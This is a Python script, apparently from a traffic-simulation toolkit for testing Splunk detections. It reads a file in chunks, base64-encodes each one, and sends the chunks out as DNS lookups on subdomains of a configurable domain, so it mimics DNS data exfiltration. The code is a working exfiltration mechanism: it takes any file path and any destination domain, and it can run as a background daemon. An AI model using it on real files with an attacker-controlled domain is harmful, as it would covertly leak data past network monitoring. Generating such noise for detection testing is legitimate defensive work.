#!/usr/local/bin/python3

# dns_exfil.py
#
# This script is designed to mimic malicious traffic by exfiltrating
# data over DNS
#
# By default, this script uses mobydick.txt
# Please don't be evil.

import argparse
import requests
import json
import time
import os
import sys
import socket
import datetime
import base64
import daemonize
import splunk_hec_sender
from configparser import ConfigParser


cfg = ConfigParser()
cfg.read('noisemaker.conf')

now_epoch = time.strftime("%s", time.localtime())
this_script = os.path.basename(__file__)
this_pid_str = str(os.getpid())

#######  Change these variables in the noisemaker.conf file #################
hec_endpoint = cfg.get('splunk_hec', 'hec_endpoint')
token = cfg.get('splunk_hec', 'token')
default_file = cfg.get('dns_exfil', 'default_file')
default_domain = cfg.get('dns_exfil', 'default_domain')

# Parse args - get money
parser = argparse.ArgumentParser(description=
    '''This script reads a text file in chunks, encodes each chunk does a DNS Lookup on each encoded chunk.
    This is designed to mimic data exfiltration or command and control traffic''')
parser.add_argument('-f', dest='file', action='store', help='the full path of the file to exfiltrate' )
parser.add_argument('-v', dest='verbose', action='store_true', help='verbose output')
parser.add_argument('-s', dest='inter_poll_seconds', action='store', help='seconds to wait between queries')
parser.add_argument('-t', dest='time', action='store', help='seconds to conduct all queries')
parser.add_argument('-d', dest='daemonize', action='store_true', help='run script as a deamon')
parser.add_argument('-hec', dest='hec', action='store_true', help='send event data to Splunk HEC')
parser.add_argument('-domain', dest='dest_domain', action='store', help='domain to query for DNS hosts')

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()


if args.verbose:
    args.daemonize = False

if args.file:
    exfil_file = args.file
else:
    exfil_file = os.getcwd() + "/" + default_file

if args.dest_domain:
    dest_domain = args.dest_domain
else:
    dest_domain = default_domain

if args.daemonize:
    daemonize.daemonize('/tmp/dns_exfil_daemon.pid',
                stdin='/dev/null',
                stdout='/tmp/dns_exfil_daemon.log',
                stderr='/tmp/dns_exfil_daemon.log')

if args.hec:
    e = splunk_hec_sender.EventPreamble()
    event_list = e.create_event_base(this_pid_str,this_script)
    e_notice = "starting DNS exfil script"
    event = [e_notice]
    event_list.extend(event)
    if args.verbose:    
        print(event_list)
    splunk_hec_sender.create_json_data(event_list,this_script)

if args.time:
    start_epoch = float(now_epoch)
    args.time = float(args.time)
    done_epoch = start_epoch + args.time
else:
    start_epoch = float(now_epoch)
    done_epoch = start_epoch + .5

if args.verbose:
    done_time = str(done_epoch)
    done_time = "Done time is " + done_time
    start_time = str(start_epoch)
    print(start_time)
    print(done_time)



with open(exfil_file, 'rt', encoding='ascii') as f:
    while done_epoch > float(time.strftime("%s", time.localtime())):
        piece = f.read(42)
        if not piece:
            break

        if args.inter_poll_seconds:
            sleepytime = float(args.inter_poll_seconds)
            #print(sleepytime)
            #time.sleep(sleepytime)
        else:
            sleepytime = 2

        if args.verbose:
            print(start_epoch)
            print(done_epoch)
            sleepytime = str(args.inter_poll_seconds)
            if sleepytime:
                s_sleepytime = str(sleepytime)
                msg = "Sleeping " + s_sleepytime + " seconds"
                print(msg)

        sleepytime = int(sleepytime)
        time.sleep(sleepytime)
                
        if args.verbose:
            msg = "Making DNS Lookup"
            print(msg)

        encoded = base64.b64encode(piece.encode())
        # TODO: change mrhaha.net to something that's read from the config file
        hostname = encoded.decode('ascii') + "." + dest_domain
        print(hostname)

        # we know that doing this dns lookup will fail, but
        # we don't care
        try:
            addr1 = socket.gethostbyname(hostname)
        except (socket.gaierror):
            e = splunk_hec_sender.EventPreamble()
            event_list = e.create_event_base(this_pid_str,this_script)
            e_notice = "Requested encoded hostname"
            e_hostname = "encoded_hostname=" + str(hostname)
            event = [e_notice, e_hostname]
            event_list.extend(event)
            if args.verbose:
                print(event_list)
            if args.hec:
                splunk_hec_sender.create_json_data(event_list,this_script)

if start_epoch > done_epoch:
        msg = "We out!"
        print(msg)